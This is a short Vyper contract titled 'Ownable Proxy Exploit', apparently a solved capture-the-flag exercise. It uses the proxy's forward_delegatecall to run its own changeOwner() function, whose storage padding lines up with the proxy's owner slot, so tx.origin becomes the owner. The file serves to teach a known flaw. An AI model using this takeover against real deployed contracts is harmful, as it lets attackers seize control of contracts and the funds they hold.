# @version ^0.3.2

"""
@title Ownable Proxy Exploit
"""

interface Ownableproxy:
    def forward_call(target: address, payload: Bytes[32]): nonpayable
    def forward_call_with_value(target: address, payload: Bytes[32], msg_value: uint256): nonpayable
    def forward_delegatecall(target: address, payload: Bytes[32]): nonpayable
    def __default__(): payable
    def owner() -> address: view

storage_padding: uint256[32]

owner: address

target: address

@external
def __init__(target: address):
    self.target = target

# YOUR EXPLOIT HERE
@external
def run():
    Ownableproxy(self.target).forward_delegatecall(self, method_id("changeOwner()"))

@external
def changeOwner():
    self.owner = tx.origin
